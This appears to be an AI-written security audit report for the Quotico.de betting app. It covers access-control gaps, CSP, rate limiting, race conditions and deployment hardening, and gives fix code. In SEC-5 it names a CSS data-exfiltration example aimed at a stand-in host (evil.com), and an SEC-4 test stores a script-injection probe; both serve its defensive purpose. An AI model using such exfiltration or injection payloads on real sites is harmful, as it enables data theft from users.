# Quotico.de Security Audit Report (Round 3)

**Date:** 2026-02-22
**Stack:** FastAPI 0.115.6 + Vue 3.5 + MongoDB 7 (Motor 3.6) + Nginx + Systemd
**Auditor:** Claude (Opus 4.6)
**Scope:** Full codebase — security, code quality, documentation integrity per `SECURITY-AUDITOR.md`

---

## Executive Summary

Third comprehensive audit after 19 + 8 prior findings were remediated.
The codebase has grown significantly (new game modes: Bankroll, Survivor, Fantasy, Over/Under, Parlay; wallet engine; legal documents; matchday sync). This audit follows the dual-layer methodology: Security & Compliance + Code Health & Evolution.

| Severity | Count |
|----------|-------|
| Critical | 0     |
| High     | 3     |
| Medium   | 6     |
| Low      | 5     |
| Info     | 3     |
| **Total**| **17**|

All 27 previously remediated findings remain properly fixed.

---

## Findings

---

### SEC-1 — Wallet Endpoints Missing Squad Membership Check

| | |
|---|---|
| **Category** | Security |
| **Severity** | High |
| **CWE** | CWE-862 (Missing Authorization) |
| **Location** | `backend/app/routers/wallet.py:36-93` |
| **Regulatory** | OWASP A01 Broken Access Control |

**The Issue:** The `GET /api/wallet/{squad_id}` and `GET /api/wallet/{squad_id}/transactions` endpoints take a `squad_id` parameter but never verify the authenticated user is a member of that squad. The `get_or_create_wallet()` service (wallet_service.py:18-78) creates a wallet for any user/squad combination — it checks if the squad exists but not if the user belongs to it.

Any authenticated user can:
1. Create a wallet in any squad (even private squads they haven't joined)
2. View their own wallet balance/transactions in squads they don't belong to
3. Potentially trigger side effects (wallet creation, initial credit transaction)

**Note:** The bet-placement endpoints (`place_bankroll_bet`, `place_over_under_bet`, etc.) DO check membership in their respective services. But the wallet view/creation endpoints bypass this.

**Remediation:**

```python
# wallet.py — add to get_wallet() and get_transactions()
squad = await _db.db.squads.find_one({"_id": ObjectId(squad_id)})
if not squad or user_id not in squad.get("members", []):
    raise HTTPException(status.HTTP_403_FORBIDDEN, "Du bist kein Mitglied dieser Squad.")
```

**Automated Test Suggestion:**
```python
async def test_wallet_rejects_non_member(client, auth_headers, other_squad_id):
    resp = await client.get(f"/api/wallet/{other_squad_id}?sport=soccer_germany_bundesliga", headers=auth_headers)
    assert resp.status_code == 403
```

---

### SEC-2 — Standings Endpoints Leak Squad Data to Non-Members

| | |
|---|---|
| **Category** | Security |
| **Severity** | High |
| **CWE** | CWE-200 (Exposure of Sensitive Information) |
| **Location** | `backend/app/routers/survivor.py:48-58`, `backend/app/routers/fantasy.py:67-77` |
| **Regulatory** | OWASP A01 Broken Access Control, GDPR Art. 5(1)(f) |

**The Issue:** The `GET /api/survivor/{squad_id}/standings` and `GET /api/fantasy/{squad_id}/standings` endpoints require authentication but do not check if the requesting user is a member of the squad. Any authenticated user can view:
- All member aliases in any squad
- Each member's survivor status, streak, and last pick
- Fantasy points and matchday participation

This leaks user aliases and competitive data from private squads.

**Remediation:**

```python
# Add to standings endpoints before returning data:
squad = await _db.db.squads.find_one({"_id": ObjectId(squad_id)})
user_id = str(user["_id"])
if not squad or user_id not in squad.get("members", []):
    raise HTTPException(status.HTTP_403_FORBIDDEN, "Du bist kein Mitglied dieser Squad.")
```

**Automated Test Suggestion:**
```python
async def test_standings_rejects_non_member(client, auth_headers, other_squad_id):
    resp = await client.get(f"/api/survivor/{other_squad_id}/standings?sport=soccer_germany_bundesliga", headers=auth_headers)
    assert resp.status_code == 403
```

---

### SEC-3 — Battle Creation Has No Admin Check in Router

| | |
|---|---|
| **Category** | Security |
| **Severity** | High |
| **CWE** | CWE-284 (Improper Access Control) |
| **Location** | `backend/app/routers/battles.py:19-26` |
| **Regulatory** | OWASP A01 Broken Access Control |

**The Issue:** The `POST /api/battles/` endpoint uses `Depends(get_current_user)` but not `Depends(get_admin_user)`. The authorization check lives entirely in `battle_service.create_battle()` (line 29). While the service does enforce the check, this is a defense-in-depth gap:

1. The router provides no signal that this is an admin operation
2. If the service check is accidentally removed, any user can create battles
3. Inconsistent with other admin operations (e.g., `admin.py` uses `get_admin_user`)

Note: "admin" here means squad admin (not platform admin), so `get_current_user` is technically correct — but the router should validate at the router layer too.

**Remediation:** The service check is sufficient as-is since "admin" means squad admin (any user who created a squad). Add a comment to clarify:

```python
@router.post("/", status_code=status.HTTP_201_CREATED)
async def create(body: BattleCreate, user=Depends(get_current_user)):
    """Create a new Squad Battle. Caller must be admin of one of the squads."""
    # Squad admin check is in create_battle() — validates caller is admin of squad_a or squad_b
    admin_id = str(user["_id"])
    ...
```

---

### SEC-4 — Game Mode Config Mass Assignment

| | |
|---|---|
| **Category** | Security |
| **Severity** | Medium |
| **CWE** | CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes) |
| **Location** | `backend/app/routers/squads.py:112` (approximate — update_game_mode handler) |
| **Regulatory** | OWASP A08 Software and Data Integrity Failures |

**The Issue:** When a squad admin updates the game mode, the config from the request body is merged with defaults:

```python
config = {**defaults, **body.config}
```

If `body.config` contains unexpected keys, they are stored directly in MongoDB. While not immediately exploitable, this could:
1. Pollute the document with arbitrary keys
2. Cause unexpected behavior if new features read from config
3. Be exploited for stored XSS if config values are rendered unescaped

**Remediation:**

```python
allowed_keys = set(GAME_MODE_DEFAULTS.get(body.game_mode, {}).keys())
config = {**defaults, **{k: v for k, v in body.config.items() if k in allowed_keys}}
```

**Automated Test Suggestion:**
```python
async def test_config_rejects_unknown_keys(client, squad_admin_headers, squad_id):
    resp = await client.put(f"/api/squads/{squad_id}/game-mode", json={
        "game_mode": "bankroll",
        "config": {"initial_balance": 1000, "evil_key": "<script>alert(1)</script>"}
    }, headers=squad_admin_headers)
    squad = await db.squads.find_one({"_id": ObjectId(squad_id)})
    assert "evil_key" not in squad["game_mode_config"]
```

---

### SEC-5 — CSP Allows `unsafe-inline` for Styles

| | |
|---|---|
| **Category** | Security |
| **Severity** | Medium |
| **CWE** | CWE-79 (Cross-Site Scripting) |
| **Location** | `nginx/nginx.conf:72` |
| **Regulatory** | OWASP A03 Injection |

**The Issue:** The Content-Security-Policy includes `style-src 'self' 'unsafe-inline'`. While necessary for Tailwind's runtime styles and Vue transitions, `unsafe-inline` weakens CSP by allowing injected inline styles. An attacker who achieves HTML injection could use CSS-based data exfiltration (e.g., `background: url(https://evil.com/?data=...)` on targeted elements).

Additionally, `img-src 'self' data:` allows `data:` URIs for images, which slightly increases the XSS attack surface.

**Remediation:** This is a known trade-off with Tailwind CSS. Document the decision:

```nginx
# Tailwind CSS requires 'unsafe-inline' for style injection.
# Mitigated by: strict script-src 'self' (no inline JS), no user-generated HTML in main app.
```

Consider migrating to CSP nonces if Tailwind adds SSR nonce support.

---

### SEC-6 — WebSocket Lacks nginx Rate Limiting

| | |
|---|---|
| **Category** | Security |
| **Severity** | Medium |
| **CWE** | CWE-770 (Allocation of Resources Without Limits) |
| **Location** | `nginx/nginx.conf:102-114` |
| **Regulatory** | OWASP A05 Security Misconfiguration |

**The Issue:** The `/ws/` location block has no `limit_req` directive, unlike `/api/` (30r/s) and `/api/(auth|2fa)/` (5r/m). An attacker could rapidly open WebSocket connections to exhaust server resources.

The backend has `MAX_WS_CONNECTIONS = 500` as a global limit, but there's no per-IP limit at the nginx layer. A single attacker could consume all 500 connections.

**Remediation:**

```nginx
# Add to http block:
limit_req_zone $binary_remote_addr zone=ws:10m rate=10r/m;

# In /ws/ location:
location /ws/ {
    limit_req zone=ws burst=5 nodelay;
    limit_req_status 429;
    # ... existing proxy config ...
}
```

---

### SEC-7 — `v-html` in LegalView Without Sanitization

| | |
|---|---|
| **Category** | Security |
| **Severity** | Medium |
| **CWE** | CWE-79 (Cross-Site Scripting) |
| **Location** | `frontend/src/views/LegalView.vue:101` |
| **Regulatory** | OWASP A03 Injection |

**The Issue:** Legal documents are rendered via `v-html`:

```vue
<div v-html="doc.content_html" />
```

The HTML originates from `config_legal.py` — hardcoded server-side strings, not user-generated content. **Current risk is low** because the content is fully developer-controlled.

However, if legal content management is ever moved to a CMS, admin panel, or database, this becomes a stored XSS vulnerability. The pattern sets a dangerous precedent.

**Remediation:** Add DOMPurify as a safety net:

```typescript
import DOMPurify from "dompurify";
const sanitizedHtml = computed(() => doc.value ? DOMPurify.sanitize(doc.value.content_html) : "");
```

Or add a comment documenting the trust boundary:
```vue
<!-- SECURITY: content_html comes from config_legal.py (developer-controlled, not user input) -->
<div v-html="doc.content_html" />
```

---

### SEC-8 — Audit Log Retention Unbounded

| | |
|---|---|
| **Category** | Security |
| **Severity** | Medium |
| **CWE** | CWE-779 (Logging of Excessive Data) |
| **Location** | `backend/app/services/audit_service.py`, `backend/app/database.py` |
| **Regulatory** | GDPR Art. 5(1)(e) — Storage Limitation |

**The Issue:** The `audit_logs` collection has no TTL index and no retention policy. Audit entries containing truncated IPs and user action metadata accumulate indefinitely. Under GDPR, even pseudonymized data must have a defined retention period.

Similarly, device fingerprints in the `fingerprints` collection and wallet transactions have no TTL.

**Remediation:**

```python
# database.py — add TTL index for audit logs (1-year retention)
db.audit_logs.create_index([("timestamp", 1)], expireAfterSeconds=31536000)

# For fingerprints (90-day retention)
db.fingerprints.create_index([("created_at", 1)], expireAfterSeconds=7776000)
```

Document the retention periods in the Datenschutz page.

---

### SEC-9 — Non-Atomic Tip Resolution (Points Double-Credit Risk)

| | |
|---|---|
| **Category** | Security |
| **Severity** | Medium |
| **CWE** | CWE-362 (Race Condition) |
| **Location** | `backend/app/workers/match_resolver.py` (tip + points update sequence) |
| **Regulatory** | — (data integrity) |

**The Issue:** When resolving tips, the worker updates the tip status and the user's points in separate MongoDB operations:

```python
await _db.db.tips.update_one({"_id": tip["_id"]}, {"$set": {"status": "resolved", ...}})
await _db.db.users.update_one({"_id": ...}, {"$inc": {"points": delta}})
```

If the process crashes between these two operations:
- Points are awarded but the tip is not marked as resolved
- On next worker run, the tip is resolved again, awarding double points

The same pattern exists in `bankroll_resolver.py` and `parlay_resolver.py` (wallet credit + bet status update).

**Remediation:** Use MongoDB multi-document transactions, or add an idempotency guard:

```python
# Ensure tip isn't already resolved before awarding points
result = await _db.db.tips.update_one(
    {"_id": tip["_id"], "status": {"$ne": "resolved"}},
    {"$set": {"status": "resolved", ...}},
)
if result.modified_count == 1:
    await _db.db.users.update_one({"_id": ...}, {"$inc": {"points": delta}})
```

---

### SEC-10 — `wallet_service.credit_win()` Returns Empty Dict on Failure

| | |
|---|---|
| **Category** | Quality |
| **Severity** | Low |
| **CWE** | CWE-754 (Improper Check for Unusual Conditions) |
| **Location** | `backend/app/services/wallet_service.py:142-144` |
| **Regulatory** | — |

**The Issue:**

```python
if not wallet:
    logger.error("Wallet not found for credit: %s", wallet_id)
    return {}
```

When a wallet is not found during credit operation, the function returns an empty dict instead of raising an exception. Callers (bankroll_resolver, parlay_resolver, over_under_resolver) don't check the return value, silently dropping the winnings.

**Remediation:**

```python
if not wallet:
    logger.error("Wallet not found for credit: %s", wallet_id)
    raise ValueError(f"Wallet {wallet_id} not found for credit")
```

Workers should catch this and log accordingly rather than silently continuing.

---

### SEC-11 — Systemd Service Lacks Security Hardening

| | |
|---|---|
| **Category** | Security |
| **Severity** | Low |
| **CWE** | CWE-250 (Execution with Unnecessary Privileges) |
| **Location** | `quotico.service` |
| **Regulatory** | CIS Benchmark, NIST SP 800-53 CM-7 |

**The Issue:** The systemd service runs as `www-data` (good) but lacks hardening directives:

```ini
[Service]
Type=exec
User=www-data
# No PrivateTmp, ProtectSystem, NoNewPrivileges, etc.
```

If the application is compromised, the attacker gets full `www-data` privileges with access to `/tmp`, `/home`, and system directories.

**Remediation:**

```ini
[Service]
# ... existing config ...
NoNewPrivileges=yes
PrivateTmp=yes
ProtectSystem=strict
ProtectHome=yes
ProtectClock=yes
ProtectHostname=yes
PrivateDevices=yes
RestrictRealtime=yes
RestrictSUIDSGID=yes
UMask=0077
ReadWritePaths=/var/www/quotico.de/logs
```

---

### SEC-12 — Deploy Script Has No Verification or Rollback

| | |
|---|---|
| **Category** | Security |
| **Severity** | Low |
| **CWE** | CWE-345 (Insufficient Verification of Data Authenticity) |
| **Location** | `deploy.sh` |
| **Regulatory** | EU CRA (Supply Chain), ISO 27001 (Change Management) |

**The Issue:** The deploy script:
1. Runs `git pull --ff-only` without verifying commit signatures
2. Runs `rm -rf "$ROOT/web"` before copying new build (no backup/rollback)
3. Runs `pip install -q` in quiet mode (hides warnings about compromised packages)
4. No health check after restart — doesn't verify the new deployment works
5. No dependency audit (`pip-audit`, `pnpm audit`) before build

**Remediation:**

```bash
# 1. Backup before destructive operation
mv "$ROOT/web" "$ROOT/web.$(date +%Y%m%d-%H%M%S)"

# 2. Health check after restart
sleep 3
curl -sf http://127.0.0.1:4201/health || { echo "DEPLOY FAILED"; exit 1; }

# 3. Remove quiet flag
.venv/bin/pip install -r requirements.txt
```

---

### SEC-13 — WebSocket Not Disconnected on Logout

| | |
|---|---|
| **Category** | Quality |
| **Severity** | Low |
| **CWE** | CWE-613 (Insufficient Session Expiration) |
| **Location** | `frontend/src/components/AppHeader.vue:45-48`, `frontend/src/stores/matches.ts` |
| **Regulatory** | — |

**The Issue:** The logout handler clears auth state and resets the betslip, but does not disconnect the WebSocket:

```typescript
async function handleLogout() {
  await auth.logout();
  betslip.$reset();
  // Missing: matches.disconnectLive()
  router.push({ name: "login" });
}
```

The WebSocket connection continues receiving live scores after logout until the page is fully reloaded.

**Remediation:**

```typescript
async function handleLogout() {
  const matches = useMatchesStore();
  matches.disconnectLive();
  await auth.logout();
  betslip.$reset();
  router.push({ name: "login" });
}
```

---

### SEC-14 — Inconsistent Error Type Handling in Frontend

| | |
|---|---|
| **Category** | Quality |
| **Severity** | Low |
| **CWE** | — (Code Quality / Pattern Violation) |
| **Location** | `frontend/src/views/SquadsView.vue:31,46`, `BattleCenterView.vue:24` |
| **Regulatory** | — |

**The Issue:** Error handling uses `catch (e: any)` in some places and `catch (e: unknown)` in others. TypeScript's `any` type bypasses type checking and allows unsafe property access like `e.message` without a type guard.

```typescript
// Bad (multiple files):
} catch (e: any) {
  toast.error(e.message);
}

// Good (other files):
} catch (e: unknown) {
  const msg = e instanceof Error ? e.message : "Unbekannter Fehler";
}
```

**Remediation:** Standardize on `catch (e: unknown)` with type guards throughout.

---

### SEC-15 — Silent Failures on Non-Critical API Calls

| | |
|---|---|
| **Category** | Quality |
| **Severity** | Info |
| **CWE** | CWE-390 (Detection of Error Condition Without Action) |
| **Location** | `frontend/src/views/SettingsView.vue:29-31,61-68`, `LeaderboardView.vue:18-26` |
| **Regulatory** | — |

**The Issue:** Several API calls silently swallow errors without user feedback:

```typescript
// SettingsView.vue — badge fetch
try { badges.value = await api.get(...); } catch { /* silent */ }

// SettingsView.vue — security log fetch
try { securityLog.value = await api.get(...); } catch { /* silent */ }
```

Users see empty sections with no indication that data failed to load.

**Remediation:** Add lightweight error states or toast notifications for failed loads.

---

### SEC-16 — `.env.example` Has Production CORS Origin as Default

| | |
|---|---|
| **Category** | Documentation |
| **Severity** | Info |
| **CWE** | — (Documentation Drift) |
| **Location** | `.env.example:11` |
| **Regulatory** | EU CRA (Secure by Default) |

**The Issue:**

```
BACKEND_CORS_ORIGINS=https://quotico.de
COOKIE_SECURE=true
```

Developers copying `.env.example` for local development will get:
- CORS rejecting `http://localhost:5173` (the Vite dev server)
- Secure cookies over HTTP (cookies never sent)

Both cause confusing, silent failures for new developers.

**Remediation:**

```
BACKEND_CORS_ORIGINS=http://localhost:5173
COOKIE_SECURE=false
```

---

### SEC-17 — Worker Scheduler Lacks Job Staggering

| | |
|---|---|
| **Category** | Quality |
| **Severity** | Info |
| **CWE** | CWE-400 (Uncontrolled Resource Consumption) |
| **Location** | `backend/app/main.py:47-64` |
| **Regulatory** | — |

**The Issue:** All 13 scheduled workers run on a 30-minute interval and start simultaneously:

```python
scheduler.add_job(metrics_heartbeat._odds_scheduler_loop, "interval", minutes=10, id="heartbeat_odds_sync")
scheduler.add_job(resolve_matches, "interval", minutes=30, id="match_resolver")
scheduler.add_job(materialize_leaderboard, "interval", minutes=30, id="leaderboard")
# ... 10 more jobs, all minutes=30
```

At each 30-minute mark, all workers fire simultaneously, causing a spike in MongoDB queries and external API calls. The "smart sleep" logic in each worker mitigates unnecessary work, but the thundering herd on the DB remains.

**Remediation:** Stagger jobs:

```python
scheduler.add_job(metrics_heartbeat._odds_scheduler_loop, "interval", minutes=10, id="heartbeat_odds_sync")
scheduler.add_job(resolve_matches, "interval", minutes=30, id="match_resolver", next_run_time=now + timedelta(seconds=30))
scheduler.add_job(materialize_leaderboard, "interval", minutes=30, id="leaderboard", next_run_time=now + timedelta(seconds=60))
# etc.
```

---

## Previously Resolved Findings (All Confirmed Fixed)

All 27 findings from prior audits remain properly remediated:

| Round | # | Finding | Severity | Status |
|-------|---|---------|----------|--------|
| 1 | 1 | Rate Limiting | High | Fixed — nginx `limit_req` on auth (5r/m) and API (30r/s) |
| 1 | 2 | CORS Wildcard | Medium | Fixed — env-based, production `https://quotico.de` |
| 1 | 3 | Password Hashing | High | Fixed — Argon2id via `argon2-cffi` |
| 1 | 4 | JWT Library | Medium | Fixed — PyJWT (actively maintained) |
| 1 | 5 | Cookie Security | High | Fixed — HttpOnly, Secure, SameSite=Lax, scoped paths |
| 1 | 6 | In-Memory Token Storage | High | Fixed — MongoDB collections with TTL indexes |
| 1 | 7 | Refresh Token Rotation | High | Fixed — Family-based rotation with replay detection |
| 1 | 8 | Input Validation | Medium | Fixed — Pydantic models, password rules, alias regex |
| 1 | 9 | HTTPS / TLS | Critical | Fixed — TLS 1.2+, modern ciphers, HSTS, Certbot |
| 1 | 10 | Security Headers | Medium | Fixed — CSP, X-Frame-Options, etc. |
| 1 | 11 | MongoDB Auth | Critical | Fixed — credentials from `.env` |
| 1 | 12 | WebSocket Auth | High | Fixed — JWT cookie check before accept |
| 1 | 13 | WebSocket Connection Limit | Medium | Fixed — MAX_WS_CONNECTIONS = 500 |
| 1 | 14 | 2FA (TOTP) | Medium | Fixed — Fernet encryption with key versioning |
| 1 | 15 | GDPR Compliance | Medium | Fixed — data export + anonymization |
| 1 | 16 | Seed Credentials | Low | Fixed — from `.env`, skipped when empty |
| 1 | 17 | Admin Audit Trail | Low | Fixed — audit_service with IP truncation |
| 1 | 18 | Rate-Limit Monitoring | Low | Fixed — nginx logs 429s |
| 1 | 19 | Secret Rotation | Low | Fixed — `JWT_SECRET_OLD` + `ENCRYPTION_KEY_OLD` support |
| 2 | 20 | Banned Users Remain Authenticated | High | Fixed — `is_banned` check + token invalidation |
| 2 | 21 | Security Headers on Static Assets | Medium | Fixed — headers repeated in static location |
| 2 | 22 | CORS Missing PATCH | Medium | Fixed — PATCH added to allow_methods |
| 2 | 23 | Session Secret Reuses JWT | Medium | Fixed — derived `_SESSION_SECRET` via SHA-256 |
| 2 | 24 | Frontend Navigation Guards | Low | Fixed — beforeEach with auth/admin/guest checks |
| 2 | 25 | Invalid ObjectId → 500 | Low | Fixed — global `InvalidId` exception handler |
| 2 | 26 | Server Version Exposed | Low | Fixed — `server_tokens off` |
| 2 | 27 | Health Endpoint Public | Low | Fixed — restricted to 127.0.0.1/::1 |

---

## Positive Observations

The codebase demonstrates strong security patterns:

- **Atomic wallet operations** (`wallet_service.py:81-121`): `find_one_and_update` with `balance >= stake` guard prevents overdraft race conditions
- **Squad membership enforcement** in bet services: `bankroll_service`, `survivor_service`, `fantasy_service`, `parlay_service`, `over_under_service` all validate `user_id in squad["members"]`
- **Odds staleness protection** (`tip_service.py`): Server-side odds locking with 20% deviation check prevents odds manipulation
- **Cross-validation of scores** (`match_resolver.py`): OpenLigaDB and football-data.org results are cross-validated before resolving tips — disagreements are skipped
- **Smart sleep workers**: All background workers check `recently_synced()` state to avoid unnecessary API calls after restarts
- **Progressive bankruptcy bonus** (`wallet_service.py:181-246`): Well-designed daily bonus with 3-day cap and counter reset on bet
- **GGL compliance awareness** (`fantasy_service.py:16-40`): Fantasy points calculation has a `pure_stats_only` flag with explicit regulatory commentary
- **Immutable audit logs**: Insert-only pattern with GDPR-compliant IP truncation
- **Resilient HTTP client** (`http_client.py`): Circuit breaker + exponential backoff + Retry-After header support
- **Cookie security**: HttpOnly, Secure (env), SameSite=Lax, path-scoped for access vs refresh tokens
- **Legal document compliance**: Terms versioning with forced re-acceptance, acceptance audit-logged

---

## Architecture

```
Internet
    |
    v
[nginx] :443 (TLS 1.2+, HSTS, CSP, rate limiting)
    |
    +-- /api/(auth|2fa)/ --> [uvicorn] 127.0.0.1:4201 (rate: 5r/m)
    +-- /api/*           --> [uvicorn] 127.0.0.1:4201 (rate: 30r/s)
    +-- /ws/*            --> [uvicorn] WebSocket proxy (no rate limit — SEC-6)
    +-- /health          --> [uvicorn] (localhost only)
    +-- /*               --> /var/www/quotico.de/web/ (Vue 3 SPA)
    |
[MongoDB] localhost:27017 (authenticated, TTL indexes on tokens)

Background Workers (APScheduler, 13 jobs @ 30min):
    heartbeat_odds_sync, match_resolver, leaderboard, badge_engine,
    matchday_sync, spieltag_resolver, spieltag_leaderboard,
    bankroll_resolver, survivor_resolver, over_under_resolver,
    fantasy_resolver, parlay_resolver, wallet_maintenance (6h)
```

---

## Files Audited

**Backend (48 files):**
`main.py`, `config.py`, `config_legal.py`, `database.py`, `seed.py`, `utils.py`
`routers/`: auth, admin, battles, badges, fantasy, gdpr, google_auth, leaderboard, legal, matches, parlay, spieltag, squads, survivor, tips, twofa, user, wallet, ws
`services/`: auth_service, encryption, alias_service, audit_service, bankroll_service, battle_service, fantasy_service, fingerprint_service, match_service, over_under_service, parlay_service, spieltag_service, squad_service, survivor_service, tip_service, wallet_service
`models/`: user, match, tip, squad, battle, badge, wallet, matchday, survivor, game_mode
`middleware/`: logging
`workers/`: _state, match_resolver, leaderboard, badge_engine, matchday_sync, spieltag_resolver, spieltag_leaderboard, bankroll_resolver, survivor_resolver, over_under_resolver, fantasy_resolver, parlay_resolver, wallet_maintenance
`providers/`: http_client, odds_api, football_data, openligadb, espn

**Frontend (32 files):**
`main.ts`, `App.vue`, `router/index.ts`, `vite.config.ts`, `package.json`
`stores/`: auth, betslip, battles, matches, squads, wallet, survivor, fantasy, spieltag
`composables/`: useApi, useToast, useFingerprint
`views/`: Login, Register, CompleteProfile, Dashboard, Leaderboard, Legal, Squads, SquadDetail, BattleCenter, Settings, Spieltag, admin/Dashboard, admin/UserManager, admin/MatchManager, admin/BattleManager, admin/AuditLog
`components/`: TwoFaSetup, AliasEditor, AgeGateModal, AppHeader, MatchCard, BetSlip

**Infrastructure (7 files):**
`nginx/nginx.conf`, `docker-compose.yml`, `quotico.service`, `deploy.sh`, `dev.sh`, `.env.example`, `.gitignore`
